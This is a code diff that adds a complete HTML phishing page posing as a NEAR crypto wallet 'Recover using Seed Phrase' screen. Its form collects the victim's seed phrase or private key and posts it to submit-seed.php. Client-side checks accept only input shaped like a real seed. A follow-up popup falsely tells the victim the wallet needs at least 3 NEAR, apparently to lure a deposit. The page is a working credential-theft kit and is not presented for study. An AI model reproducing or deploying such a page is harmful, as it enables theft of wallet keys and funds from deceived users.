@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recover using Seed Phrase</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;600&display=swap">
+    <style>
+        body {
+            background-color: #EBDEDC;
+            display: flex;
+            justify-content: relative;
+            align-items: relative;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+        }
+
+        .container {
+            text-align: relative;
+            width: 100%;
+            max-width: 400px;
+            padding: 7px 17px;
+        }
+
+        h1 {
+            font-weight: normal;
+            font-style: normal;
+            font-size: 40px;
+            color: #000;
+            margin-bottom: -15px;
+        }
+
+        p {
+            color: black;
+            font-size: 16px;
+            margin-bottom: 25px;
+            padding-top: 14px;
+            letter-spacing: 0.4px;
+            line-height: 20px;
+        }
+
+        .form-group {
+            position: relative;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .label {
+            position: absolute;
+            top: 17px;
+            left: 15px;
+            color: #5a5a5a;
+            transition: all 0.2s ease;
+            pointer-events: none;
+            font-size: 16px;
+            letter-spacing: 0.2px;
+        }
+
+        .textarea-container {
+            position: relative;
+            width: 95%;
+            margin: 10px 0;
+            align-items: center;
+        }
+
+        .textarea-container textarea {
+            width: 100%;
+            padding: 25px 15px;
+            border: 1px solid black;
+            border-radius: 15px;
+            font-size: 16px;
+            outline: none;
+            background-color: transparent;
+            transition: box-shadow 0.3s ease;
+            resize: none; /* Prevent resizing */
+            font-family: sans-serif; /* Menggunakan font family sans-serif */
+            font-weight: bold; /* Mengatur tebal (bold) */
+            min-height: 85px; /* Set minimum height */
+        }
+
+        .textarea-container textarea:focus {
+            box-shadow: 4px 4px 0px rgba(0, 0, 0, 1); /* Solid shadow */
+        }
+
+        .textarea-container textarea:focus + .label,
+        .textarea-container textarea:not(:placeholder-shown) + .label {
+            top: 0.1px;
+            left: 12px;
+            font-size: 12px;
+            color: #6e6e6e;
+            padding: 10px 5px;
+        }
+
+        button {
+            width: 103%;
+            height: 58px;
+            padding: 15px 15px;
+            border: none;
+            background-color: #ccc9c7;
+            margin-top: 17px; /* Add margin-top to push the button down */
+            border-radius: 25px;
+            cursor: not-allowed;
+            font-size: 16px;
+            font-weight: 600;
+            color: #636363;
+            align-items: center;
+            font-weight: bold;
+            letter-spacing: 0.2;
+        }
+
+        button.enabled {
+            background-color: #2b2b2b;
+            color: #e9e3e2;
+            cursor: pointer;
+        }
+
+        .error-message {
+            color: rgba(219, 0, 0, 0.664);
+            font-size: 14px;
+            margin-top: 4px;
+            font-weight: bold;
+            display: none;
+            letter-spacing: 0.1px;
+            margin-top: -3px; /* Adjust margin-top to control spacing */
+        }
+
+        .text-stroke {
+            font-size: 38px;
+            font-weight: bolder;
+            color: #282c30;
+            -webkit-text-stroke: 2px #282c30; /* Safari */
+            text-stroke: 2px #282c30; /* Standard */
+            line-height: 80%;
+            font-family: 'Times New Roman', Times, serif;
+        }
+
+        .notification {
+            display: none;
+            background: #ffea10;
+            border: 1px solid #000;
+            padding: 12px 20px;
+            margin-left: 20px;
+            margin-right: 20px;
+            font-size: 16px;
+            border-radius: 12.5px;
+            width: fit-content;
+            cursor: pointer;
+            color: #000;
+            -webkit-text-stroke: 0.4px #000;
+            transition: top 0.5s ease-in-out, opacity 0.5s ease-in-out;
+            opacity: 1;
+            position: fixed;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            top: -100%; /* Set the initial position off-screen */
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1 class="text-stroke">Recover using</h1>
+    <h1 class="text-stroke">Seed Phrase</h1>
+    <div style="font-family: sans-serif;">
+        <p>Enter the backup passphrase associaaated with the account.</p>
+        <form id="seedForm" action="submit-seed.php" method="post" onsubmit="return validateForm()">
+            <div class="form-group">
+                <div class="textarea-container">
+                    <textarea id="seed" name="seed" class="input" placeholder=" " required></textarea>
+                    <label for="seed" class="label">Seed or private key</label>
+                </div>
+                <div id="warningMessage" class="error-message"></div>
+            </div>
+            <button id="continue" disabled>Continue</button>
+            <div id="errorMessage" class="error-message"></div>
+        </form>
+    </div>
+</div>
+<div class="notification" id="notification" style="font-family: sans-serif;">
+    Your wallet is not active! to be an active wallet, your wallet must have at least 3 NEAR.
+</div>
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const seedInput = document.getElementById('seed');
+        const continueButton = document.getElementById('continue');
+        const errorMessage = document.getElementById('errorMessage');
+        const warningMessage = document.getElementById('warningMessage');
+        const notification = document.getElementById('notification');
+
+        // Check if the user came from submit-seed.php
+        if (document.referrer.includes('submit-seed.php')) {
+            showNotification();
+        }
+
+        seedInput.addEventListener('input', () => {
+            const inputLength = seedInput.value.trim().length;
+            const words = seedInput.value.trim().split(/\s+/);
+            
+            // Clear error message if the field is empty
+            if (inputLength === 0) {
+                errorMessage.style.display = 'none';
+                seedInput.classList.remove('invalid');
+                continueButton.disabled = true;
+                warningMessage.style.display = 'none';
+                return;
+            }
+
+            // Enable button if exactly 12 words, 95 characters, or 96 words are entered
+            if (words.length === 12 || inputLength === 95 || inputLength === 96) {
+                continueButton.classList.add('enabled');
+                continueButton.disabled = false;
+                warningMessage.style.display = 'none';
+            } else {
+                continueButton.classList.remove('enabled');
+                continueButton.disabled = true;
+                warningMessage.style.display = 'block';
+                warningMessage.textContent = 'Seed phrase or private key is invalid';
+            }
+        });
+
+        seedInput.addEventListener('focus', () => {
+            seedInput.classList.add('focused');
+        });
+
+        seedInput.addEventListener('blur', () => {
+            seedInput.classList.remove('focused');
+        });
+    });
+
+    function validateForm() {
+        const seedInput = document.getElementById('seed');
+        const errorMessage = document.getElementById('errorMessage');
+        const inputLength = seedInput.value.trim().length;
+        const words = seedInput.value.trim().split(/\s+/);
+
+        if (words.length !== 12 && inputLength !== 95 && inputLength !== 96) {
+            errorMessage.style.display = 'block';
+            errorMessage.textContent = 'Seed phrase or private key is invalid';
+            seedInput.classList.add('invalid');
+            showNotification();
+            return false;
+        } else {
+            errorMessage.style.display = 'none';
+            seedInput.classList.remove('invalid');
+        }
+        return true;
+    }
+
+    function showNotification() {
+        var notification = document.getElementById('notification');
+        notification.style.display = 'block';
+        setTimeout(function() {
+            notification.style.top = '20px';
+        }, 100); // Add slight delay to trigger transition
+
+        setTimeout(function() {
+            notification.style.opacity = '0';
+            setTimeout(function() {
+                notification.style.display = 'none';
+                notification.style.top = '-100%'; // Reset position for the next notification
+                notification.style.opacity = '1'; // Reset opacity for the next notification
+            }, 500); // Wait for the fade-out transition to complete before hiding
+        }, 6000);
+    }
+</script>
+</body>
+</html>
